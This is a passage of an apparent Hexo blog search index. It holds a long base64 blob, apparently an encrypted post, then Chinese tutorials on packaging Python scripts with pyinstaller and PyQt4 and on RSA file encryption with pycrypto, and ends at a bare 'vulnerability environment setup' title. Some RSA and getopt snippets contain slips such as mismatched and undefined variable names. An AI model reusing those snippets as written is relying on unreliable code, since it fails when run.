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]]></content>
      <categories>
        <category>Code</category>
        <category>VBA</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>VBA</tag>
        <tag>Excel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Excel-双击自动引用图片(一)]]></title>
    <url>%2Farchives%2F343e4570.html</url>
    <content type="text"><![CDATA[第一次见面年月日xxxx.xx.xx ]]></content>
      <categories>
        <category>Code</category>
        <category>VBA</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>VBA</tag>
        <tag>Excel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-py转exe(附GUI界面)]]></title>
    <url>%2Farchives%2F2329ebda.html</url>
    <content type="text"><![CDATA[有时候写了一个脚本，但是换到另外一台电脑上的时候，发现并没有Python的解析环境，这时候将py文件转成exe，再将其换到另外一台Windows电脑运行，是一个很好的选择。准备py转exe有:py2exe、pyinstaller等多种选择。这两种我都用过，我更倾向于pyinstaller。本文使用的就是pyinstaller。pyinstaller使用pip快捷安装pyinstaller。如果对pyinstaller感兴趣，可以参考文档1pip install pyinstaller如果无法使用pip安装，可以在官网下载源码安装。成功安装可以输出对应版本信息。py文件将py文件转exe，那么必备的就是py文件了。本文采用我以前写的RSA加密文件脚本，可以在这里下载。转换Exe有了pyinstaller之后，将py文件转成exe只需要一条命令即可完成。该条命令会生成两个文件夹:build、dist。生成的exe在dist文件夹中。1pyinstaller Encryptiong.py单文件生成刚刚转换出来的exe有许多依赖的文件在dist文件夹下。就是说想要运行这个exe，那么整个dist文件夹下所有文件都需要存在。pyinstaller提供了将py文件转换成单exe模式，只需要在转换命令加上-F参数即可。1pyinstaller Encryptiong.py -F压缩如果转换出来的exe大小很大，pyinstaller也支持压缩。压缩需要下载upx，并加上对应参数即可。1pyinstaller Encryptiong.py -F --upx-dir D:\Code\Python27\upx394w图标现在已经成功生成了exe，但是现在的exe图标很”大众”。这是pyinstaller默认图标，如果想自定义图标的话，pyinstaller也提供了对应参数-i。但是需要提供多种尺寸的ico图标，因为不同情况下需要不一样尺寸的图标。可以使用png2ico工具转换，使用png2ico需要使用对应的命令。1png2ico myicon.ico icon_128x128.png icon_64x64.png icon_48x48.png icon_32x32.png icon_16x16.png也可以使用在线转换工具ConvertIcon!,导出的时候需要勾对应尺寸。有了图标之后，使用对应命令即可。1pyinstaller Encryptiong.py -F --upx-dir D:\Code\Python27\upx394w -i ico.icoGUI界面现在生成的exe文件，打开之后连GUI界面都没有。没有GUI界面的exe就是耍流氓。(Ps:来源某位小伙伴)我这么正经的人，怎么可能耍流氓！Python想要生成GUI界面，需要安装PyQt。我安装的是PyQt4。由于最新版的PyQt已经不提供Windows二进制安装程序，大家可以安装4.11.4版本。找到合适自己的版本，下载、安装即可。UI生成安装完PyQt4之后，大家可以在Python27\Lib\site-packages\PyQt4文件夹找到designer.exe用来构建GUI界面的UI。打开designer.exe新建一个窗体，通过左边拖拽控件，将控件按照自己喜欢的位置布局到窗体里面。设计好了保存成ui文件即可。最后可以Python27\Lib\site-packages\PyQt4\pyuic4.bat来生成对应的布局代码。1pyuic4.bat -o EncryptiongUi.py EncryptiongUi.ui生成的布局代码文件有一个Ui类，其中包含了setupUi、retranslateUi函数。GUI生成用了UI布局，现在新建一个脚本(Encry.py)通过代码生成一个窗体即可。12345678910111213141516171819202122# -*- coding: utf-8 -*-from PyQt4.QtGui import * from PyQt4 import QtGuifrom PyQt4.QtCore import * import sys import EncryptiongUiclass TestDlg(QDialog, EncryptiongUi.Ui_RSA): # 继承EncryptiongUI.UI_RSA def __init__(self, parent=None): super(TestDlg, self).__init__(parent) self.setupUi(self) # self.setWindowIcon(QtGui.QIcon('./ico.ico')) # 设置icon def main(): app = QApplication(sys.argv) dialog = TestDlg() dialog.show() sys.exit(app.exec_()) if __name__ == '__main__': main()运行Encry.py即可生成一个GUI界面。控件功能配置我设计了一个包含两个line、三个button的窗体。根据button来执行Encryptiong.py的不同功能，根据line的值进行传参。首先对Encryptiong.py脚本进行改造。只需要把180、181注释，让其不运行即可。12# if __name__ == '__main__': # main()其次对EncryptiongUI.py进行改造。导入Encryptiong的Encryptiong，用来执行加密、解密等功能。1from Encryptiong import Encryptiong接下来将按钮的单击属性打开。一共需要打开三个按钮的属性,pushButton是按钮的自定义名称，根据命名进行修改。12self.pushButton.setCheckable(True)self.pushButton.setChecked(True)然后在UI类中，编写工作的函数。1234567891011121314151617def work(self, Ctype): try: if Ctype == 1: Encryptiong().encryp() QtGui.QMessageBox.about(self, u'提醒', u"成功生成公、私钥文件！") # 设置提醒消息框 elif Ctype == 2: public = str(self.lineEdit.text()) # 获取line的文本 filepath = str(self.lineEdit_2.text()) # 获取line2的文本 Encryptiong(public=public, filepath=filepath).encryption() QtGui.QMessageBox.about(self, u'提醒', u"完成加密！") elif Ctype == 3: private = str(self.lineEdit.text()) filepath = str(self.lineEdit_2.text()) Encryptiong(private=private,decrypt=filepath).decrypted() QtGui.QMessageBox.about(self, u'提醒', u"完成解密！") except: QtGui.QMessageBox.about(self, u'警告', u"输入有误,请重新输入！")回到Ui类的setupUi函数，设置按钮单击执行工作函数。123self.pushButton.clicked.connect(lambda : self.work(1)) # 单击调用work函数self.pushButton_2.clicked.connect(lambda : self.work(2))self.pushButton_3.clicked.connect(lambda : self.work(3))现在已经成功让Encryotiong脚本的功能通过GUI界面来执行、实现。最后通过pyinstaller进行打包成exe。1pyinstaller -F -w -i ico.ico --upx-dir D:\Code\Python27\upx394w Encryptiong.py总结在编写使用pyinstaller、PyQt4生成GUI界面的exe时，遇到几个问题，在此记录一下。pyinstaller -i加载图标的时候，图标需要是多种尺寸的图标。要不然某些情况是无法显示的;pyinstaller -w生成无终端窗口需要脚本有GUI界面;PyQt4的Button执行函数，需要使用lambda生成匿名函数;PyQt4的QMessageBox进行弹框提示需要将字符串转成Unicode编码，要不然会乱码。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-RSA加密文件]]></title>
    <url>%2Farchives%2Ffb3e56b9.html</url>
    <content type="text"><![CDATA[每个人都有自己的小秘密，如何保护好它是非常重要的。我通过Python27结合RSA算法保护我的”小秘密”。准备使用pycrypto库就可以完成RSA加、解密。Pycrypto使用pip快捷安装pycrypto。如果对pycrypto感兴趣，可以参考文档。1pip install pycrypto如果无法使用pip安装，可以在这里下载编译好的源文件进行安装。终端处理终端信息获取可以通过sys.argv或者使用getopt库。syssys.argv是一个列表对象。用来获取终端信息。终端格式示例。1python getinfo.py info1 info2 info3sys.argv[0]是getinfo.py，sys.argv[1]是info1，sys.argv[2]是info2，sys.argv[3]是info3。Getoptgetopt可以用来获取终端参数，实际使用的时候效果比sys.argv好很多。如果对getopt感兴趣，可以参考文档getopt有短格式、长格式。”-h-f:”为短格式，如果后面带冒号说明该参数需要加参数值，不加冒号说明该参数不需要加参数值。”[‘help’, ‘file=’]”为长格式，如果后面带等号说明该参数需要加参数值，如果后面不带等号说明该参数不需要参数值。终端格式示例。1python getinfo.py -h -f=info.txt代码示例。1234567import getoptopt, args = getopt.getopt(sys.argv[1:], "-h-f:",['help', 'file='])for opt_name, opt_value in opts: if opt_name in ('-h', '--help'): print "This is help!" if opt_name in ('-f', '--file'): print opt_valuepycrypto使用pycrypto包含许多加密方式：AES、SHA256、RSA等。出于安全性考虑，我使用RSA来加密文件。生成公、私钥文件RSA加密需要使用到公钥文件、RSA解密需要使用到私钥文件。如果大家对RSA算法不了解的话，可以参考Wiki)。通过上文可以得知，生成自己的公钥、私钥文件是十分重要的。pycrypto支持生成公钥、私钥文件。代码示例。12345678910111213from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSArandom_generator = Random.new().read # 伪随机数生成器rsa = RSA.generate(self.generateNum, random_generator) # rsa算法生成private_pem = rsa.exportKey() # 私钥生成with open('private.pem', 'w') as f: # 生成私钥文件 f.write(private_pem)public_pem = rsa.publickey().exportKey() # 公钥生成with open('public.pem', 'w') as f: # 生成公钥文件 f.write(public_pem)RSA加密RSA加密需要使用到公钥文件。代码示例。1234567891011from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAmessage = "My name is Hywell!"with open('public.pem') as f: # 读取公钥文件 key = f.read()rsakey = RSA.importKey(key) # 加载公钥cipher = Cipher_pkcs1_v1_5.new(rsakey)cipher_text = cipher.encrypt(message) # 加密messageRSA解密RSA解密需要使用到私钥文件。代码示例。123456789101112from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAcipher_text = "This is cryptoStr!"random_generator = Random.new().read # 伪随机数生成器with open('ghost-private.pem') as f: # 读取私钥文件 key = f.read()rsakey = RSA.importKey(key) # 加载私钥cipher = Cipher_pkcs1_v1_5.new(rsakey)result = cipher.decrypt(base64.b64decode(encrypt_text), random_generator) # 解密cipher_text总结在编写使用RSA加密文件时，遇到了几个问题，在此记录一下。使用getopt库作为命令行参数获取，使用for获取对应参数的值的时候，获取得到值是以=开头。因此，实际需要使用value[1:]来获取;RSA加密常见的key_size有1024bit、2048bit两种，解密的时候需要选择跟加密时一样的bit;RSA加密单次加密字符的长度有限制，最大为(key_size/8)-11;使用1024bitRSA加密100长度的字符会生成128长度的加密过的字符;使用2048bitRSA加密200长度的字符会生成256长度的加密过的字符。完整代码完整代码支持终端获取参数、文件夹所有文件RSA加密、文件夹所有文件RSA解密。完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞环境搭建]]></title>
    <url>%2Farchives%2F583f4516.html</url>
